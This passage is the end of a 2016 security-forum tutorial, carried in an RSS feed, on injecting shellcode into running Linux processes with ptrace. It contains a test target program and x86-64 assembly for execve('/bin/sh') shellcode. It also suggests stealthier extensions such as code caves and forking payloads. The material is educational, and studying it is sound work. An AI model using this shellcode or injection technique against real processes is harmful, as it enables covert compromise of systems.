<p>What you see there is the address that caused the segmentation fault. If you compare it with the address reported by the injector you can see the 2 bytes difference. Fixing that and the stack permissions made the injector work fine.</p>
<h1>Testing Program</h1>
<p>In order to test this concept I wrote a very simple program. It just prints its <code>pid</code> (so I do not have to look for it), and then writes 10 times a message in the screen waiting 2 seconds between messages. This gives you time to launch the injector.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main()
{   
    int i;

    printf ("PID: %d\n", (int)getpid());
    for(i = 0;i &lt; 10; ++i) {

	write (1, "Hello World\n", 12);
        sleep(2);
    }
    getchar();
    return 0;
}

</code></pre>
<p>The shellcode I used was produced from this simple assembler file:</p>
<pre><code class="lang-auto">section .text
        global _start

_start:
        xor rax,rax
        mov rdx,rax             ; No Env
        mov rsi,rax             ; No argv
        lea rdi, [rel msg]

        add al, 0x3b

        syscall
        msg db '/bin/sh',0

</code></pre>
<h1>Final Word</h1>
<p><code>ptrace</code> is a very powerful tool. In this paper we have just shown the very basics. Now it is a good time to fire up your terminal and type <code>man ptrace</code> to learn about the wonders of this system call.</p>
<p>You may try a couples of things yourself, in case you are interested:</p>
<ul>
<li>Modify the injector to feed the code in a code cave</li>
<li>Use more sophisticated shellcodes that forks a process and keeps the original program running</li>
<li>Your shellcode will be running on the target project and will have access to all open files…</li>
</ul>
<p><em>Note: I haven’t tried any of these things myself</em> <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>As usual, you can find all the code for this paper in my github account.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="noopener nofollow ugc">0x00pf/0x00sec_code</a></h3>

<p>Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Hack Fun!</p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/1</link>
        <pubDate>Fri, 16 Sep 2016 20:25:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-1</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
  </channel>
</rss>
